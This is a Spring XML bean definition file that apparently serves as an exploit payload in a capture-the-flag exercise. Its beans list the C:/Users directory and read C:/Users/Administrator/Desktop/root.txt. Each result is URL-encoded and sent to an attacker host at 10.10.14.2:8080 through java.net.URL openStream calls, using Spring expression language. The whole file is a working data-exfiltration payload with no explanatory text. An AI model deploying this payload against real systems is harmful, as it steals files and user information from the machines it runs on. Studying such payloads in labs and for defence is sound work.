<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
       http://www.springframework.org/schema/beans/spring-beans.xsd">

    <!-- List C:\Users to find usernames -->
    <bean id="usersDir" class="java.io.File">
        <constructor-arg value="C:/Users"/>
    </bean>
    <bean id="usersList" class="org.springframework.beans.factory.config.MethodInvokingFactoryBean">
        <property name="targetObject" ref="usersDir"/>
        <property name="targetMethod" value="list"/>
    </bean>
    <bean id="usersStr" class="java.util.Arrays" factory-method="toString">
        <constructor-arg ref="usersList"/>
    </bean>
    <bean id="usersUrl" class="java.net.URL" depends-on="usersStr">
        <constructor-arg value="#{'http://10.10.14.2:8080/users?v=' + T(java.net.URLEncoder).encode(@usersStr,'UTF-8')}"/>
    </bean>
    <bean id="usersReq" factory-bean="usersUrl" factory-method="openStream" depends-on="usersUrl"/>

    <!-- Read root.txt -->
    <bean id="rootRes" class="org.springframework.core.io.FileSystemResource" depends-on="usersReq">
        <constructor-arg value="C:/Users/Administrator/Desktop/root.txt"/>
    </bean>
    <bean id="rootStream" factory-bean="rootRes" factory-method="getInputStream"/>
    <bean id="rootBytes" class="org.springframework.util.FileCopyUtils"
          factory-method="copyToByteArray">
        <constructor-arg ref="rootStream"/>
    </bean>
    <bean id="rootContent" class="java.lang.String">
        <constructor-arg ref="rootBytes"/>
    </bean>
    <bean id="rootUrl" class="java.net.URL" depends-on="rootContent">
        <constructor-arg value="#{'http://10.10.14.2:8080/root?v=' + T(java.net.URLEncoder).encode(@rootContent,'UTF-8')}"/>
    </bean>
    <bean id="rootReq" factory-bean="rootUrl" factory-method="openStream" depends-on="rootUrl"/>

</beans>
